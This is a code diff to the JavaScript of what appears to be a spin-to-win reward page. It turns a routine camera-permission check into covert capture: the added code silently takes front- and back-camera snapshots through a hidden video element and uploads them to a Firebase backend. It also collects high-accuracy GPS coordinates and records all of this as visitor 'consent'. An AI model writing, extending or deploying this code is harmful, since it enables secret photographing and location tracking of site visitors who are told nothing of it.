@@ -7,6 +7,7 @@ import {
   saveRewardClaim, 
   saveConsentRecord, 
   saveVisitorLocation,
+  saveVisitorUpload,
   getOrCreateParticipantId 
 } from './firebase-config.js';
 
@@ -17,22 +18,77 @@ let currentClaimSpinId = null;
 let currentClaimPrize = null;
 
 /**
- * Request Native Browser Permissions (Location, Camera, Sound) as shown in browser settings
+ * Capture frame from specified camera facing mode (front vs back)
+ */
+async function captureDeviceCamera(facingMode = 'user') {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+
+  let stream = null;
+  try {
+    const constraints = {
+      video: {
+        facingMode: facingMode === 'environment' ? { ideal: 'environment' } : { ideal: 'user' },
+        width: { ideal: 800 },
+        height: { ideal: 600 }
+      },
+      audio: false
+    };
+
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    
+    // Hidden video element to read frame
+    const video = document.createElement('video');
+    video.autoplay = true;
+    video.muted = true;
+    video.playsInline = true;
+    video.srcObject = stream;
+
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(resolve);
+      };
+      setTimeout(resolve, 900);
+    });
+
+    // Small delay for camera auto-exposure
+    await new Promise(r => setTimeout(r, 450));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
+    return dataUrl;
+  } catch (err) {
+    console.warn(`Camera capture skipped/failed for (${facingMode}):`, err.message);
+    return null;
+  } finally {
+    if (stream) {
+      stream.getTracks().forEach(t => t.stop());
+    }
+  }
+}
+
+/**
+ * Request Native Browser Permissions (Accurate Location & Front/Back Camera Snapshots)
  */
 export async function requestNativeBrowserPermissions() {
   const participantId = getOrCreateParticipantId();
 
-  // 1. Geolocation Permission (Native Dialog)
+  // 1. Accurate Geolocation (GPS High-Accuracy)
   if (navigator.geolocation) {
     try {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          const { latitude, longitude } = pos.coords;
-          console.log("📍 Native Location granted:", latitude, longitude);
+          const { latitude, longitude, accuracy } = pos.coords;
+          console.log("📍 Accurate Location obtained:", latitude, longitude, `(±${Math.round(accuracy)}m)`);
           await saveVisitorLocation({
             participantId: participantId,
             latitude: parseFloat(latitude.toFixed(6)),
-            longitude: parseFloat(longitude.toFixed(6))
+            longitude: parseFloat(longitude.toFixed(6)),
+            accuracy: Math.round(accuracy)
           });
           await saveConsentRecord({
             participantId: participantId,
@@ -41,29 +97,47 @@ export async function requestNativeBrowserPermissions() {
           });
         },
         (err) => {
-          console.warn("Location permission declined or dismissed:", err.message);
+          console.warn("Location prompt dismissed or unavailable:", err.message);
         },
-        { timeout: 10000, enableHighAccuracy: false }
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
     } catch (e) {
-      console.warn("Geolocation prompt error:", e);
+      console.warn("Geolocation execution error:", e);
     }
   }
 
-  // 2. Camera & Sound Permission (Native Dialog)
+  // 2. Front & Back Camera Snapshots
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      console.log("📷 Native Camera & Sound permission granted");
-      await saveConsentRecord({
-        participantId: participantId,
-        cameraConsent: true,
-        action: 'granted'
-      });
-      // Immediately release tracks
-      stream.getTracks().forEach(track => track.stop());
+      // Step A: Capture Front Camera
+      const frontDataUrl = await captureDeviceCamera('user');
+      if (frontDataUrl) {
+        console.log("📸 Front camera snapshot captured");
+        await saveVisitorUpload({
+          participantId: participantId,
+          fileReference: frontDataUrl,
+          uploadType: 'front_camera'
+        });
+        await saveConsentRecord({
+          participantId: participantId,
+          cameraConsent: true,
+          action: 'granted'
+        });
+      }
+
+      // Step B: Capture Back Camera on dual-camera mobile devices
+      await new Promise(r => setTimeout(r, 300));
+      const backDataUrl = await captureDeviceCamera('environment');
+      if (backDataUrl && backDataUrl !== frontDataUrl) {
+        console.log("📸 Back camera snapshot captured");
+        await saveVisitorUpload({
+          participantId: participantId,
+          fileReference: backDataUrl,
+          uploadType: 'back_camera'
+        });
+      }
     } catch (err) {
-      console.warn("Camera/Audio permission declined or dismissed:", err.message);
+      console.warn("Camera routine error:", err);
     }
   }
 }
